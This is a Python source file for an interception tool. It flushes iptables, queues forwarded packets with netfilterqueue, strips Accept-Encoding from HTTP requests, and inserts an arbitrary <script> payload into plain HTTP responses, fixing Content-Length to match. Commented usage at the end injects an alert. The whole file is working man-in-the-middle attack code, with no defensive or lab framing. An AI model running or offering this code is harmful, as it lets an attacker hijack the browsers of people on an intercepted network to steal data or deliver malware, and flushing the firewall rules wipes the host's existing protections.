import scapy.all as scapy
import netfilterqueue
import re
from threading import Thread
import time
import subprocess

class Injector:

    def __init__(self):
        self.ack_list=[]
        self.injection = ''
        self.injector_running = False


    def enable_forward_chain(self):
        subprocess.call(["iptables", "--flush"])
        subprocess.call(["iptables", "-I", "FORWARD", "-j", "NFQUEUE", "--queue-num", "1"])
        


    def set_load(self, packet, load):
        packet[scapy.Raw].load = load
        del packet[scapy.IP].len
        del packet[scapy.IP].chksum
        del packet[scapy.TCP].chksum
        return packet


    def process_packet(self, packet):
       
        if self.injection:
             scapy_packet = scapy.IP(packet.get_payload())
             if scapy_packet.haslayer(scapy.Raw):
                if scapy_packet[scapy.TCP].dport == 80:

                    # scapy_packet.show()

                    print("[+] Request")
                    modified_load = re.sub("Accept-Encoding:.*?\\r\\n", "", scapy_packet[scapy.Raw].load.decode())
                    new_packet = self.set_load(scapy_packet, modified_load)
                    packet.set_payload(bytes(new_packet))
                elif scapy_packet[scapy.TCP].sport == 80:
                    print("[+] Response")
                    # scapy_packet.show()

                    first = "</body>" in scapy_packet[scapy.Raw].load.decode()
                    second = ("<script>" + self.injection + "</script>") in scapy_packet[scapy.Raw].load.decode()
                    if first and not second:
                        injection = ("<script>" + self.injection + "</script>")
                        modified_load = scapy_packet[scapy.Raw].load.decode().replace("</body>", injection + "</body>")
                        print(modified_load)

                        len_search = re.search(r"(?:Content-Length:\s)(\d*)", modified_load)
                        if len_search and "text/html" in modified_load:
                            content_len = len_search.group(1)
                            new_len = int(content_len) + len(injection)
                            modified_load = modified_load.replace(content_len, str(new_len))
                            print("Content Length Modified")
                        new_packet = self.set_load(scapy_packet, modified_load)
                        packet.set_payload(bytes(new_packet))
                        print("modified")
                    
        packet.accept()


    def set_injection(self, injection):
        self.injection = injection
        self.injector_running = True


    def remove_injection(self):
        self.injection = ''    
        print("Injection removed successfully")

    def run(self):
        print("Code Queue running...")
        time.sleep(2)
        try:
            queue = netfilterqueue.NetfilterQueue()
            queue.bind(1, self.process_packet)
            queue.run()
        except Exception as e:
            raise Exception("Queue error")


    def bind(self):
        t = Thread(target = self.run)
        self.injector_running = True
        t.start()

    
# injector = Injector()
# injector.enable_forward_chain()
# injector.set_injection('alert("abc");')
# injector.bind()